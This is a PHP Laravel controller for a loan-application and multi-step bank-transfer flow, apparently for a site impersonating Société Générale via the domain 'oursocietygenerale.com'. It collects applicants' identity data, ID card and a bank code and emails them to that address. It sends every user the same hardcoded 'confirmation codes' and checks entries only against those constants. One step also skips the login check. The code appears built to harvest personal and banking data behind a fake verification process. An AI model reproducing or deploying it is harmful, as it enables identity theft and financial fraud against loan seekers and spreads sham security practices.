<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Pret;
use App\Virement;
use App\Utilisateur;
use App\CodeConfirm;
use Illuminate\Support\Facades\Mail;
use App\Mail\PretMail;
use App\Mail\VirementMail;
use App\Mail\CodeMail;
use App\Mail\CodeMail2;


class OperationController extends Controller
{
    public function pret()
    {
    	return view('front.operation');
    }

    public function pretPost(Request $request)
    {
    	request()->validate([
    		'nom'=>'required|max:50',
    		'prenom'=>'required|max:50',
    		'date_naissance'=>'required',
    		'telephone'=>'required',
    		'adresse'=>'required',
            'ville'=>'required',
    		'rolePret'=>'max:255',
            'pays'=>'required',
    		'idCard'=>'required',
    		'montantPret'=>'required',
    		'revenuAnnuel'=>'required',
    		'statutProfessionnel'=>'required',
    		'email'=>'required|email',
    	]);

        $pret = new Pret;

        $pret->nom = request('nom');
        $pret->prenom = request('prenom');
        $pret->devise = request('devise');
        $pret->deviseRevenu = request('deviseRevenu');
        $pret->date_naissance = request('date_naissance');
        $pret->telephone = request('telephone');
        $pret->adresse = request('adresse');
        $pret->ville = request('ville');
        $pret->region = request('region');
        $pret->pays = request('pays');
        $pret->codePostal = request('codePostal');
        $pret->montantPret = request('montantPret');
        $pret->rolePret = request('rolePret');
        $pret->revenuAnnuel = request('revenuAnnuel');
        $pret->nousConnaitre = request('nousConnaitre');
        $pret->statutProfessionnel = request('statutProfessionnel');
        $pret->email = request('email');
        $pret->idCard = request('idCard');
        $pret->codeBancaire = request('codeBancaire');
        $pret->delaiRemboursement = request('delaiRemboursement');

        $pret->save(); 

        Mail::to('infoline@oursocietygenerale.com')->send(new PretMail($request->except('_token')));

        $succes = 'Votre demande de prêt a été bien envoyé !';  

        return back()->withSuccess($succes);
    }

    public function indexPrets()
    {
        $prets = Pret::all();

        return view('back.prets.list', compact('prets'));
    }

    public function store($id)
    {
        $pret = Pret::findOrFail($id);

        return view('back.prets.detail', compact('pret'));
    }

    public function virement()
    {
        if(auth()->guest()){
            return redirect()->route('front.login');
        }
        
        Mail::to(auth()->user()->email)->send(new CodeMail('446944'));

        return view('front.virement');
    }

    public function virementPost(Request $request)
    {
        if(auth()->guest()){
            return redirect()->route('front.login');
        }
        request()->validate([
            'nom' => 'required|max:50',
            'prenom' => 'required|max:50',
            'iban' => 'required',
            'bicswift' => 'required',
            'nameBanque' => 'required',
            'montant' => 'required',
            'code' =>'required',
        ]);

        if(request('code') != '446944')
        {
            return redirect()->back()->withInput()->withErrors([
                'error' => ''
            ]);
        }

        $virements = new Virement;
        $virements->nom = request('nom');
        $virements->prenom = request('prenom');
        $virements->iban = request('iban');
        $virements->bicswift = request('bicswift');
        $virements->nameBanque = request('nameBanque');
        $virements->montant = request('montant');
        $virements->code = request('code');
        $virements->devise = request('devise');

        $virements->save();

        return redirect()->route('front.virement2');
    }

    public function virement2()
    {
        Mail::to(auth()->user()->email)->send(new CodeMail2('P08HG5'));
        return view('front.virement2');
    }

    public function virementPost2()
    {
        if (request('code2') == 'P08HG5') 
        {
            return redirect()->route('front.virement3');
        }
        else
        {
            return redirect()->back()->withErrors(['error' => '']);
        }
    }

    public function virement3()
    {
        return view('front.virement3');
    }
}
